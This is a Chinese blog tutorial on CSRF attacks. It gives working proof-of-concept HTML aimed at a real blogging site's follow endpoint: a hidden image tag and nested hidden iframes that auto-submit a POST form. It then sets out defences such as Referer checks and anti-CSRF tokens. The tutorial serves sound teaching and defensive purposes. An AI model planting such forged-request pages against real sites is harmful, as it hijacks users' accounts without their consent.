<h1>Web安全之CSRF攻击</h1>

<p><strong>CSRF是什么？</strong></p>

<p>CSRF（Cross Site Request Forgery），中文是跨站点请求伪造。CSRF攻击者在用户已经登录目标网站之后，诱使用户访问一个攻击页面，利用目标网站对用户的信任，以用户身份在攻击页面对目标网站发起伪造用户操作的请求，达到攻击目的。</p>

<p><strong>举个例子</strong></p>

<p><strong>简单版：</strong></p>

<p>假如博客园有个加关注的GET接口，blogUserGuid参数很明显是关注人Id，如下：</p>

<pre>
http://www.cnblogs.com/mvc/Follow/FollowBlogger.aspx?blogUserGuid=4e8c33d0-77fe-df11-ac81-842b2b196315</pre>

<p>那我只需要在我的一篇博文内容里面写一个img标签：</p>

<pre>
&lt;img style=&quot;width:0;&quot; src=&quot;http://www.cnblogs.com/mvc/Follow/FollowBlogger.aspx?blogUserGuid=4e8c33d0-77fe-df11-ac81-842b2b196315&quot;   /&gt;</pre>

<p>那么只要有人打开我这篇博文，那就会自动关注我。</p>

<p><strong>升级版：</strong></p>

<p>假如博客园还是有个加关注的接口，不过已经限制了只获取POST请求的数据。这个时候就做一个第三方的页面，但里面包含form提交代码，然后通过QQ、邮箱等社交工具传播，诱惑用户去打开，那打开过博客园的用户就中招了。</p>

<p>在说例子之前要纠正一个iframe问题，有人会直接在第三方页面这样写。如下：</p>

<pre>
&lt;!DOCTYPE HTML&gt;
&lt;html lang=&quot;en-US&quot;&gt;
&lt;head&gt;
&lt;title&gt;CSRF SHOW&lt;/title&gt;
&lt;/head&gt;
     &lt;body&gt;
          &lt;!--不嵌iframe会跳转--&gt;
          &lt;iframe style=&quot;display:none;&quot;&gt;
               &lt;form  name=&quot;form1&quot; action=&quot;http://www.cnblogs.com/mvc/Follow/FollowBlogger.aspx&quot; method=&quot;post&quot;&gt;
                    &lt;input type=&quot;hidden&quot; name=&quot;blogUserGuid&quot; value=&quot;4e8c33d0-77fe-df11-ac81-842b2b196315&quot;/&gt;
                    &lt;input type=&quot;submit&quot; value&gt;
               &lt;/form&gt;
               &lt;script&gt;
                    document.forms.form1.submit();
               &lt;/script&gt;
          &lt;/iframe&gt;
     &lt;/body&gt;
&lt;/html&gt;
</pre>

<p>这样是用问题的，由于同源策略的原因，iframe内容根本加载不出来，所以里面form提交当然不会执行。</p>

<p>PS：我尝试了chrome、IE11、Firefox，情况都是这样。</p>

<p>所以可以用嵌多一层页面方式解决，如下：</p>

<p>第一个展示页面（test）:</p>

<pre>
&lt;!DOCTYPE HTML&gt;
&lt;html lang=&quot;en-US&quot;&gt;
&lt;head&gt;
&lt;title&gt;CSRF SHOW&lt;/title&gt;
&lt;/head&gt;
     &lt;body&gt;
          &lt;iframe style=&quot;display:none;&quot; src=&quot;test2.html&quot;&gt;&lt;/iframe&gt;
     &lt;/body&gt;
&lt;/html&gt;
</pre>

<p>第二个隐藏页面（test2）:</p>

<pre>
&lt;!DOCTYPE HTML&gt;
&lt;html lang=&quot;en-US&quot;&gt;
&lt;head&gt;
&lt;title&gt;CSRF GET&lt;/title&gt;
&lt;body&gt;
     &lt;form  name=&quot;form1&quot; action=&quot;http://www.cnblogs.com/mvc/Follow/FollowBlogger.aspx&quot; method=&quot;post&quot;&gt;
          &lt;input type=&quot;hidden&quot; name=&quot;blogUserGuid&quot; value=&quot;4e8c33d0-77fe-df11-ac81-842b2b196315&quot;/&gt;
          &lt;input type=&quot;submit&quot; value&gt;
     &lt;/form&gt;
     &lt;script&gt;
          document.forms.form1.submit();
     &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</pre>

<p>这样就可以解决了，有人会问为什么要加多一层iframe，因为不嵌iframe页面会重定向，这样就降低了攻击的隐蔽性。另外我们test页面不使用XMLHTTPRequest发送POST请求，是因为有跨域的问题，而form可以跨域post数据。</p>

<p><strong>进阶版：</strong></p>

<p>假如博客园还是有个加关注的接口，已经限制POST，但博文内容是直接贴进HTML（未过滤），那就遭受XSS攻击。那么就可以直接把上面代码嵌入博文，那么只要有人打开我这篇博文，还是会自动关注我，这组合攻击方式称为XSRF。</p>

<p><strong>CSRF攻击的本质原因</strong></p>

<p>CSRF攻击是源于Web的隐式身份验证机制！Web的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的。CSRF攻击的一般是由服务端解决。</p>

<p><strong>CSRF工具的防御手段</strong></p>

<p><strong>1. 尽量使用POST，限制GET</strong></p>

<p>GET接口太容易被拿来做CSRF攻击，看第一个示例就知道，只要构造一个img标签，而img标签又是不能过滤的数据。接口最好限制为POST使用，GET则无效，降低攻击风险。</p>

<p>当然POST并不是万无一失，攻击者只要构造一个form就可以，但需要在第三方页面做，这样就增加暴露的可能性。</p>

<p><strong>2. 浏览器Cookie策略</strong></p>

<p>IE6、7、8、Safari会默认拦截第三方本地Cookie（Third-party Cookie）的发送。但是Firefox2、3、Opera、Chrome、Android等不会拦截，所以通过浏览器Cookie策略来防御CSRF攻击不靠谱，只能说是降低了风险。</p>

<p>PS：Cookie分为两种，Session Cookie（在浏览器关闭后，就会失效，保存到内存里），Third-party Cookie（即只有到了Exprie时间后才会失效的Cookie，这种Cookie会保存到本地）。</p>

<p>PS：另外如果网站返回HTTP头包含P3P Header，那么将允许浏览器发送第三方Cookie。</p>

<p><strong>3. 加验证码</strong></p>

<p>验证码，强制用户必须与应用进行交互，才能完成最终请求。在通常情况下，验证码能很好遏制CSRF攻击。但是出于用户体验考虑，网站不能给所有的操作都加上验证码。因此验证码只能作为一种辅助手段，不能作为主要解决方案。</p>

<p><strong>4. Referer Check</strong></p>

<p>Referer Check在Web最常见的应用就是&ldquo;防止图片盗链&rdquo;。同理，Referer Check也可以被用于检查请求是否来自合法的&ldquo;源&rdquo;（Referer值是否是指定页面，或者网站的域），如果都不是，那么就极可能是CSRF攻击。</p>

<p>但是因为服务器并不是什么时候都能取到Referer，所以也无法作为CSRF防御的主要手段。但是用Referer Check来监控CSRF攻击的发生，倒是一种可行的方法。</p>

<p><strong>5. Anti CSRF Token</strong></p>

<p>现在业界对CSRF的防御，一致的做法是使用一个Token（Anti CSRF Token）。</p>

<p>例子：</p>

<p>1. 用户访问某个表单页面。</p>

<p>2. 服务端生成一个Token，放在用户的Session中，或者浏览器的Cookie中。</p>

<p>3. 在页面表单附带上Token参数。</p>

<p>4. 用户提交请求后， 服务端验证表单中的Token是否与用户Session（或Cookies）中的Token一致，一致为合法请求，不是则非法请求。</p>

<p>这个Token的值必须是随机的，不可预测的。由于Token的存在，攻击者无法再构造一个带有合法Token的请求实施CSRF攻击。另外使用Token时应注意Token的保密性，尽量把敏感操作由GET改为POST，以form或AJAX形式提交，避免Token泄露。</p>

<p>注意：</p>

<p>CSRF的Token仅仅用于对抗CSRF攻击。当网站同时存在XSS漏洞时候，那这个方案也是空谈。所以XSS带来的问题，应该使用XSS的防御方案予以解决。</p>

<p><strong>总结</strong></p>

<p>CSRF攻击是攻击者利用用户的身份操作用户帐户的一种攻击方式，通常使用Anti CSRF Token来防御CSRF攻击，同时要注意Token的保密性和随机性。</p>
